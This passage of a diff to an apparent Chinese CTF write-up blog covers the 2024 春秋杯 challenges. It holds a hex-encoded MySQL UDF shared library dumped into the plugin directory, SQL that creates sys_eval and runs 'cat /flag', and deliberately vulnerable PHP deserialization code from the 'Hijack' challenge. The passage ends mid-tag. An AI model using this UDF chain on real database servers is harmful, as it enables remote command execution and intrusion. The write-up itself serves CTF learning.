4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000</span> <span class="hljs-keyword">INTO</span> DUMPFILE <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;<br></code></pre></td></tr></table></figure>
 
 <p>利用原生sql语句，写入udf.so文件，然后创建自定义函数并调用命令</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;udf.so&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> sys_eval <span class="hljs-keyword">RETURNS</span> STRING SONAME <span class="hljs-string">&#x27;udf.so&#x27;</span>;<br></code></pre></td></tr></table></figure>
 
 <p>导入成功后查看一下 mysql 函数里面是否新增了 sys_eval：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> ret <span class="operator">|</span> dl      <span class="operator">|</span> type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br><span class="line"><span class="operator">|</span> sys_eval <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> udf.dll <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.func;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------+-----+---------+----------+</span><br><span class="hljs-operator">|</span> name     <span class="hljs-operator">|</span> ret <span class="hljs-operator">|</span> dl      <span class="hljs-operator">|</span> type     <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+-----+---------+----------+</span><br><span class="hljs-operator">|</span> sys_eval <span class="hljs-operator">|</span>   <span class="hljs-number">0</span> <span class="hljs-operator">|</span> udf.dll <span class="hljs-operator">|</span> <span class="hljs-keyword">function</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+-----+---------+----------+</span><br></code></pre></td></tr></table></figure>
 
 <p>这里的 sys_eval 支持自定义，接着就可以通过创建的这个函数来执行系统命令了：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706134918265.png" alt="image-20240706134918265"></p>
+<p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706134918265.png" srcset="/img/loading.gif" lazyload alt="image-20240706134918265"></p>
 <p>flag{2d401533-badd-4db8-b064-426b95038e80}</p>
 <h1 id="Hijack"><a href="#Hijack" class="headerlink" title="Hijack"></a>Hijack</h1><p>这道题跟vnctf2024 givenphp很像，我当时这道题就没做出来&#x3D;-&#x3D;</p>
 <p>题目源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\)&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>);</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$pattern</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No injecting!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ENV</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$math</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$key</span>=<span class="title function_ invoke__">filter</span>(<span class="variable">$this</span>-&gt;key);</span><br><span class="line">        <span class="variable">$value</span>=<span class="title function_ invoke__">filter</span>(<span class="variable">$this</span>-&gt;value);</span><br><span class="line">        <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">$key</span>=<span class="subst">$value</span>&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat hints.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;math-&gt;flag))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;YesYes&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;YesYesYes&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DIFF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callback</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$back</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;callback-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are stupid, what exactly is your identity?&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$enviroment</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;hacker&quot;</span>==<span class="variable language_">$this</span>-&gt;enviroment)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hacker is bad guy!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$function_name</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.[^.]*$/&#x27;</span>, <span class="variable">$this</span>-&gt;filename, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">            <span class="variable">$uploadDir</span> = <span class="string">&quot;/tmp/&quot;</span>;</span><br><span class="line">            <span class="variable">$destination</span> = <span class="variable">$uploadDir</span> . <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>()) . <span class="variable">$matches</span>[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$value</span>[<span class="number">0</span>]));</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">rename</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$destination</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;文件成功移动到$&#123;destination&#125;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;文件移动失败。&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;非法文件名。&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FUN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fun-&gt;<span class="title function_ invoke__">getflag</span>(<span class="variable">$this</span>-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Harder&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">1</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;\(&#x27;</span>,<span class="hljs-string">&#x27;\)&#x27;</span>,<span class="hljs-string">&#x27;;&#x27;</span>,<span class="hljs-string">&#x27;bash&#x27;</span>);<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$pattern</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$a</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;No injecting!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ENV</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$math</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$key</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$this</span>-&gt;key);<br>        <span class="hljs-variable">$value</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$this</span>-&gt;value);<br>        <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$key</span>=<span class="hljs-subst">$value</span>&quot;</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat hints.txt&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;math-&gt;flag))<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;YesYes&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;YesYesYes&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DIFF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$callback</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$back</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$flag</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;callback-&gt;p;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are stupid, what exactly is your identity?&quot;</span>;<br><br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FILE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$enviroment</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;hacker&quot;</span>==<span class="hljs-variable language_">$this</span>-&gt;enviroment)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker is bad guy!!!&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$function_name</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\.[^.]*$/&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$matches</span>)) &#123;<br>            <span class="hljs-variable">$uploadDir</span> = <span class="hljs-string">&quot;/tmp/&quot;</span>;<br>            <span class="hljs-variable">$destination</span> = <span class="hljs-variable">$uploadDir</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">time</span>()) . <span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>];<br>            <span class="hljs-keyword">if</span> (!<span 